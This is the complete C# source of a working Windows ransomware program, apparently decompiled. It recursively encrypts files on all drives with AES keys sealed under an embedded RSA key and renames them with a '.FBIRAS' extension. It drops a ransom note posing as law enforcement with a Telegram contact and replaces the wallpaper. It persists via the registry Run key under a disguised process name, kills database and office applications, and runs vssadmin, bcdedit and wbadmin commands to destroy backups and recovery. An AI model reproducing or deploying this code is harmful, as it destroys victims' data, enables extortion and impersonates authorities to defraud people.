using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Back;

internal class Program
{
	private const int SHERB_NOCONFIRMATION = 1;

	private const int SHERB_NOPROGRESSUI = 2;

	private const int SHERB_NOSOUND = 4;

	private static string RANDOM_VALUE = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

	private static string RSA_PUBLIC_KEY = "<RSAKeyValue><Modulus>yZeGQiXHsdFh1pBo3b+mxyWNjJ0T/CvWmoVw9LWnRXj2FnbftUpbs9Qg5kw6+sPD49+9AFuygdsMSjKA8e0nh3p9lLYpccMLOETpFLkH0sO4tHc8pkEPhV3JmigDcpg/tn7qqg7BLThIaWXOWqXFc0K0nKFJmb8JXct+3tJ0AptWuTzyoET2Y/uFIb1FulWfgFzZuXK+Ct0/h31sIek5kkmyW4deYnlc3NePh9Wm5C562f28vdYqBLjshzpGLJyrOchNOqUO7dMZGzagC6vetW0s5kzOH0CkkhQXEXnld8SwtD+6fQBs6xwrKrZtw57mlf1r7F/3iY5bdCTAvmaixQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

	private static bool ENCRYPT_EXTENSIONS = false;

	private static string[] TARGETED_EXTENSIONS = new string[48]
	{
		".themepack", ".nls", ".diagpkg", ".lnk", ".cab", ".scr", ".drv", ".rtp", ".msp", ".prf",
		".msc", ".ico", ".key", ".ocx", ".diagcab", ".diagcfg", ".pdb", ".wpx", ".hlp", ".icns",
		".rom", ".dll", ".msstyles", ".mod", ".ps1", ".ics", ".hta", ".bin", ".cmd", ".ani",
		".386", ".lock", ".cur", ".idx", ".sys", ".com", ".deskthemepack", ".shs", ".ldf", ".theme",
		".mpa", ".nomedia", ".spl", ".cpl", ".adv", ".icl", ".msu", ".FBIRAS"
	};

	private static string[] ADDITIONAL_FOLDERS = new string[0];

	private static string EXTENSION_TYPE = ".FBIRAS";

	private static string TEXT_MESSAGE = "Attention Tax payer:" + Environment.NewLine + Environment.NewLine + "All Your files have been locked with ransomware by law enforcement for violating cyber laws. All of your important documents, photos, and videos have been encrypted and cannot be accessed without a decryption key. This is a serious offense and you must pay a fine to unlock your files." + Environment.NewLine + Environment.NewLine + "To unlock your files, follow these instructions:" + Environment.NewLine + Environment.NewLine + "1. Contact us on telegram = @Lawinfo19" + Environment.NewLine + "2. We will tell about you problem " + Environment.NewLine + "3. You need us to pay a amount for your criminal activity " + Environment.NewLine + "4. Use the decryption key to unlock your files." + Environment.NewLine + Environment.NewLine + "If you fail to comply with these instructions, the fine will increase  and your files will be permanently deleted." + Environment.NewLine + Environment.NewLine + "Do not attempt to remove the ransomware or tamper with your files. Any attempts to do so will result in the permanent loss of your data." + Environment.NewLine + Environment.NewLine + "We understand the inconvenience this may cause, but it is necessary to ensure that cyber laws are not violated. We apologize for any inconvenience and hope to resolve this matter as soon as possible." + Environment.NewLine + Environment.NewLine + "Sincerely," + Environment.NewLine + Environment.NewLine + "Law Enforcement" + Environment.NewLine;

	private static string MESSAGE_FILE = "Readme.txt";

	private static string CHANGE_PROCESS_NAME = "Runtime Broker.exe";

	private static string[] WALLPAPER_MESSAGE = new string[4] { "All your files are stolen and encrypted", "Find readme.txt and follow the ", "instruction", "Contact Telegram :- https://t.me/Lawinfo19" };

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	[DllImport("shell32.dll", CharSet = CharSet.Unicode)]
	private static extern int SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, int dwFlags);

	private static void Main(string[] args)
	{
		new Mutex(initiallyOwned: true, Environment.MachineName, out var createdNew);
		if (!createdNew)
		{
			Environment.Exit(0);
		}
		if (CHANGE_PROCESS_NAME != "")
		{
			COPY_FILE(CHANGE_PROCESS_NAME);
		}
		STARTUP();
		Parallel.ForEach(DriveInfo.GetDrives(), delegate(DriveInfo drive)
		{
			if (ENCRYPT_EXTENSIONS)
			{
				LOOK_FOR_EXTENSIONS(drive.ToString());
			}
			else
			{
				LOOK_FOR_EXCEPTIONS(drive.ToString());
			}
		});
		if (ADDITIONAL_FOLDERS.Length > 0)
		{
			Parallel.ForEach(ADDITIONAL_FOLDERS, delegate(string folder)
			{
				if (ENCRYPT_EXTENSIONS)
				{
					LOOK_FOR_EXTENSIONS(folder.ToString());
				}
				else
				{
					LOOK_FOR_EXCEPTIONS(folder.ToString());
				}
			});
		}
		DRAW_WALLPAPER(WALLPAPER_MESSAGE);
		KILL_APPS_ENCRYPT_AGAIN();
		SHADOW_AND_CATALOG();
		RECYCLE_BIN();
	}

	private static void LOOK_FOR_EXTENSIONS(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			bool Dropable = true;
			Parallel.ForEach(files, delegate(string file)
			{
				try
				{
					string fileName = Path.GetFileName(file);
					if (!EXCEPTIONAL_FILE(fileName) && Array.Exists(TARGETED_EXTENSIONS, (string E) => E == Path.GetExtension(file).ToLower()) && fileName != MESSAGE_FILE)
					{
						FileInfo fileInfo = new FileInfo(file);
						if (fileInfo.IsReadOnly)
						{
							try
							{
								fileInfo.Attributes = FileAttributes.Normal;
							}
							catch
							{
							}
						}
						if (fileInfo.Length < 524288)
						{
							FULL_ENCRYPT(file);
							File.Move(file, file + EXTENSION());
						}
						else if (fileInfo.Length > 524288)
						{
							TRIPLE_ENCRYPT(file, 131072, 0, fileInfo.Length / 2, fileInfo.Length - 131072);
							File.Move(file, file + EXTENSION());
						}
						if (Dropable)
						{
							Dropable = false;
							string path2 = path + "/" + MESSAGE_FILE;
							if (!File.Exists(path2))
							{
								File.WriteAllText(path2, TEXT_MESSAGE);
							}
						}
					}
				}
				catch
				{
				}
			});
			string[] directories = Directory.GetDirectories(path);
			Parallel.ForEach(directories, delegate(string SubdDirectory)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(SubdDirectory);
				if (directoryInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
				{
					try
					{
						directoryInfo.Attributes &= ~FileAttributes.Normal;
					}
					catch
					{
					}
				}
				if (!EXCEPTIONAL_FOLDER(directoryInfo.Name) && !EXCEPTIONAL_PATH(SubdDirectory))
				{
					LOOK_FOR_EXTENSIONS(SubdDirectory);
				}
			});
		}
		catch
		{
		}
	}

	private static void LOOK_FOR_EXCEPTIONS(string path)
	{
		try
		{
			string[] files = Directory.GetFiles(path);
			bool Dropable = true;
			Parallel.ForEach(files, delegate(string file)
			{
				try
				{
					string fileName = Path.GetFileName(file);
					string Extension = Path.GetExtension(file).ToLower();
					if (!EXCEPTIONAL_FILE(fileName) && !Array.Exists(TARGETED_EXTENSIONS, (string E) => E == Extension) && Extension != "" && fileName != MESSAGE_FILE)
					{
						FileInfo fileInfo = new FileInfo(file);
						if (fileInfo.IsReadOnly)
						{
							try
							{
								fileInfo.Attributes = FileAttributes.Normal;
							}
							catch
							{
							}
						}
						if (fileInfo.Length < 524288)
						{
							FULL_ENCRYPT(file);
							File.Move(file, file + EXTENSION());
						}
						else if (fileInfo.Length > 524288)
						{
							TRIPLE_ENCRYPT(file, 131072, 0, fileInfo.Length / 2, fileInfo.Length - 131072);
							File.Move(file, file + EXTENSION());
						}
						if (Dropable)
						{
							Dropable = false;
							string path2 = path + "/" + MESSAGE_FILE;
							if (!File.Exists(path2))
							{
								File.WriteAllText(path2, TEXT_MESSAGE);
							}
						}
					}
				}
				catch
				{
				}
			});
			string[] directories = Directory.GetDirectories(path);
			Parallel.ForEach(directories, delegate(string SubdDirectory)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(SubdDirectory);
				if (directoryInfo.Attributes.HasFlag(FileAttributes.ReadOnly))
				{
					try
					{
						directoryInfo.Attributes &= ~FileAttributes.Normal;
					}
					catch
					{
					}
				}
				if (!EXCEPTIONAL_FOLDER(directoryInfo.Name) && !EXCEPTIONAL_PATH(SubdDirectory))
				{
					LOOK_FOR_EXCEPTIONS(SubdDirectory);
				}
			});
		}
		catch
		{
		}
	}

	private static string EXTENSION()
	{
		if (EXTENSION_TYPE == "")
		{
			return "." + RANDOM_STRING(5);
		}
		return EXTENSION_TYPE;
	}

	private static bool EXCEPTIONAL_FILE(string FileName)
	{
		FileName = FileName.ToLower();
		string[] array = new string[11]
		{
			"iconcache.db", "autorun.inf", "thumbs.db", "boot.ini", "bootfont.bin", "ntuser.ini", "bootmgr", "bootmgr.efi", "bootmgfw.efi", "desktop.ini",
			"ntuser.dat"
		};
		if (Array.Exists(array, (string E) => E == FileName.ToLower()))
		{
			return true;
		}
		return false;
	}

	private static bool EXCEPTIONAL_FOLDER(string Folder)
	{
		Folder = Folder.ToLower();
		string[] array = new string[16]
		{
			"documents and settings", "PerfLogs", "program files", "program files (x86)", "programdata", "windows", "system volume information", "$recycle.bin", "mozilla", "windows.old",
			"windows.old.old", "perflogs", "appdata", "intel", "$windows.~ws", "$windows.~bt"
		};
		if (Array.Exists(array, (string E) => E == Folder.ToLower()))
		{
			return true;
		}
		return false;
	}

	private static bool EXCEPTIONAL_PATH(string path)
	{
		path = path.ToLower();
		string[] array = new string[8] { "c:\\windows", "c:\\users\\all users", "c:\\programdata", "c:\\program files (x86)", "c:\\users\\default", "c:\\program files", "c:\\perflogs", "c:\\windows.old" };
		if (Array.Exists(array, (string E) => E == path.ToLower()))
		{
			return true;
		}
		return false;
	}

	private static void TRIPLE_ENCRYPT(string filePath, int length, int beginning, long middle, long end)
	{
		string text = RANDOM_STRING(32);
		string text2 = RANDOM_STRING(16);
		byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
		byte[] array = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
		using FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite);
		fileStream.Position = beginning;
		byte[] array2 = new byte[length];
		fileStream.Read(array2, 0, length);
		byte[] array3 = ENCRYPT_DATA(text, text2, array2);
		fileStream.Position = beginning;
		fileStream.Write(array3, 0, array3.Length);
		fileStream.Position = middle;
		byte[] array4 = new byte[length];
		fileStream.Read(array4, 0, length);
		byte[] array5 = ENCRYPT_DATA(text, text2, array4);
		fileStream.Position = middle;
		fileStream.Write(array5, 0, array5.Length);
		fileStream.Position = end;
		byte[] array6 = new byte[length];
		fileStream.Read(array6, 0, length);
		byte[] array7 = ENCRYPT_DATA(text, text2, array6);
		fileStream.Position = end;
		fileStream.Write(array7, 0, array7.Length);
		fileStream.Seek(0L, SeekOrigin.End);
		fileStream.Write(array, 0, array.Length);
	}

	private static byte[] ENCRYPT_DATA(string KEY, string IV, byte[] plainText)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Key = Encoding.ASCII.GetBytes(KEY);
		rijndaelManaged.IV = Encoding.ASCII.GetBytes(IV);
		rijndaelManaged.Mode = CipherMode.CBC;
		rijndaelManaged.Padding = PaddingMode.None;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(plainText, 0, plainText.Length);
	}

	private static void FULL_ENCRYPT(string filePath)
	{
		byte[] array = File.ReadAllBytes(filePath);
		string text = RANDOM_STRING(32);
		string text2 = RANDOM_STRING(16);
		byte[] bytes = Encoding.ASCII.GetBytes(text + "|" + text2);
		byte[] array2 = RSA_ENCRYPT(RSA_PUBLIC_KEY, bytes);
		using FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Write);
		fileStream.SetLength(0L);
		byte[] array3 = null;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Key = Encoding.ASCII.GetBytes(text);
			rijndaelManaged.IV = Encoding.ASCII.GetBytes(text2);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(array, 0, array.Length);
			}
			array3 = memoryStream.ToArray();
		}
		fileStream.Write(array3, 0, array3.Length);
		fileStream.Seek(0L, SeekOrigin.End);
		fileStream.Write(array2, 0, array2.Length);
	}

	private static byte[] RSA_ENCRYPT(string publicKeyString, byte[] dataToEncrypt)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKeyString);
		return rSACryptoServiceProvider.Encrypt(dataToEncrypt, fOAEP: false);
	}

	private static string RANDOM_STRING(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			byte[] array = new byte[4];
			while (length-- > 0)
			{
				rNGCryptoServiceProvider.GetBytes(array);
				uint num = BitConverter.ToUInt32(array, 0);
				stringBuilder.Append(RANDOM_VALUE[(int)(num % (uint)RANDOM_VALUE.Length)]);
			}
		}
		return stringBuilder.ToString();
	}

	public static void DRAW_WALLPAPER(string[] lines)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		Rectangle bounds = Screen.PrimaryScreen.Bounds;
		int width = bounds.Width;
		int height = bounds.Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.Clear(ColorTranslator.FromHtml("Black"));
			Font val3 = new Font("Arial", 36f, (FontStyle)1);
			SolidBrush val4 = new SolidBrush(ColorTranslator.FromHtml("White"));
			StringFormat val5 = new StringFormat();
			val5.Alignment = (StringAlignment)1;
			val5.LineAlignment = (StringAlignment)1;
			int num = (int)(val3.GetHeight() + 5f);
			int num2 = height / 2 - lines.Length / 2 * num;
			foreach (string text in lines)
			{
				val2.DrawString(text, val3, (Brush)(object)val4, new RectangleF(0f, num2, width, num), val5);
				num2 += num;
			}
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		string text2 = Path.GetTempPath() + RANDOM_STRING(9) + ".jpg";
		((Image)val).Save(text2, ImageFormat.Jpeg);
		SystemParametersInfo(20u, 0u, text2, 3u);
	}

	private static void STARTUP()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(MESSAGE_FILE.Split(new char[1] { '.' })[0], location);
		registryKey.Close();
	}

	private static void COPY_FILE(string FILE_NAME)
	{
		try
		{
			string fileName = Process.GetCurrentProcess().MainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + FILE_NAME;
			if (fileName != text)
			{
				if (File.Exists(text))
				{
					File.Delete(text);
					Thread.Sleep(500);
				}
				byte[] bytes = File.ReadAllBytes(fileName);
				Thread.Sleep(100);
				File.WriteAllBytes(text, bytes);
				ProcessStartInfo startInfo = new ProcessStartInfo(text);
				Process process = new Process();
				process.StartInfo = startInfo;
				if (process.Start())
				{
					Environment.Exit(1);
				}
			}
		}
		catch
		{
		}
	}

	private static void KILL_APPS_ENCRYPT_AGAIN()
	{
		string[] array = new string[50]
		{
			"sqlwriter", "sqbcoreservice", "VirtualBoxVM", "sqlagent", "sqlbrowser", "sqlservr", "code", "steam", "zoolz", "agntsvc",
			"firefoxconfig", "infopath", "synctime", "VBoxSVC", "tbirdconfig", "thebat", "thebat64", "isqlplussvc", "mydesktopservice", "mysqld",
			"ocssd", "onenote", "mspub", "mydesktopqos", "CNTAoSMgr", "Ntrtscan", "vmplayer", "oracle", "outlook", "powerpnt",
			"wps", "xfssvccon", "ProcessHacker", "dbeng50", "dbsnmp", "encsvc", "excel", "tmlisten", "PccNTMon", "mysqld-nt",
			"mysqld-opt", "ocautoupds", "ocomm", "msaccess", "msftesql", "thunderbird", "visio", "winword", "wordpad", "mbamtray"
		};
		string[] array2 = array;
		foreach (string processName in array2)
		{
			Process[] processesByName = Process.GetProcessesByName(processName);
			foreach (Process process in processesByName)
			{
				process.CloseMainWindow();
			}
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo drive in drives)
		{
			TaskFactory factory = Task.Factory;
			Action action = delegate
			{
				if (ENCRYPT_EXTENSIONS)
				{
					LOOK_FOR_EXTENSIONS(drive.ToString());
				}
				else
				{
					LOOK_FOR_EXCEPTIONS(drive.ToString());
				}
			};
			factory.StartNew(action).Wait();
		}
	}

	private static void SHELL_COMMAND(string commands)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = "/C " + commands;
			process.StartInfo = processStartInfo;
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void SHADOW_AND_CATALOG()
	{
		SHELL_COMMAND("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		SHELL_COMMAND("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
		SHELL_COMMAND("wbadmin delete catalog -quiet");
	}

	private static void RECYCLE_BIN()
	{
		try
		{
			SHEmptyRecycleBin(IntPtr.Zero, null, 7);
		}
		catch
		{
		}
	}

	private void ENCRYPT_ADDITIONAL_FOLDER()
	{
	}
}
